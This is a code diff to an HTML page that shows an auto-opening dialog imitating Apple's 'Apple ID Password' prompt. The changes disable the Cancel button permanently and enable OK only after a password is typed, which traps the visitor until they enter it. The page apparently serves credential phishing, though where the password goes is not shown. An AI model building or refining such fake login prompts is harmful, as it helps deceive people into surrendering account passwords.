@@ -46,6 +46,7 @@
     .dlg-divider{height:1px; background:#e0e0e0}
     .dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
     .dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
+    .dlg-btn:disabled{color:#999; cursor:not-allowed}
     .dlg-btn:active{background:#f5f5f5}
     .dlg-btn + .dlg-btn{border-left:1px solid #e0e0e0}
 
@@ -112,8 +113,8 @@
       <div class="field" id="field"><input id="password" class="input" type="password" placeholder="password" autocomplete="current-password" aria-label="Apple ID Password" /></div>
       <div class="dlg-divider" aria-hidden="true"></div>
       <div class="dlg-actions" id="dlg-actions">
-        <button type="button" class="dlg-btn" id="cancelBtn">Cancel</button>
-        <button type="button" class="dlg-btn" id="okBtn">OK</button>
+        <button type="button" class="dlg-btn" id="cancelBtn" disabled>Cancel</button>
+        <button type="button" class="dlg-btn" id="okBtn" disabled>OK</button>
       </div>
     </section>
   </div>
@@ -137,9 +138,18 @@
       overlay.addEventListener('focusin', (e)=>{ if(!dialog.contains(e.target)) dialog.focus(); });
 
       openBtn && openBtn.addEventListener('click', open);
-      cancelBtn.addEventListener('click', close);
-      okBtn.addEventListener('click', ()=>{ 
-        if(pass.value.trim().length===0){ 
+
+      // Enable OK button only when password is entered
+      pass.addEventListener('input', () => {
+        if (pass.value.trim().length > 0) {
+          okBtn.disabled = false;
+        } else {
+          okBtn.disabled = true;
+        }
+      });
+
+      okBtn.addEventListener('click', () => { 
+        if (pass.value.trim().length === 0) { 
           alert('Please enter your password.'); 
           return;
         } 
@@ -159,7 +169,10 @@
         pass.value = '';
         setTimeout(() => document.getElementById('cancelBtnNew').focus(), 0);
       });
-      pass.addEventListener('keydown', (e)=>{ if(e.key==='Enter') okBtn.click(); });
+
+      pass.addEventListener('keydown', (e) => { 
+        if (e.key === 'Enter' && !okBtn.disabled) okBtn.click(); 
+      });
 
       // Auto-open on load as requested
       window.addEventListener('load', open);
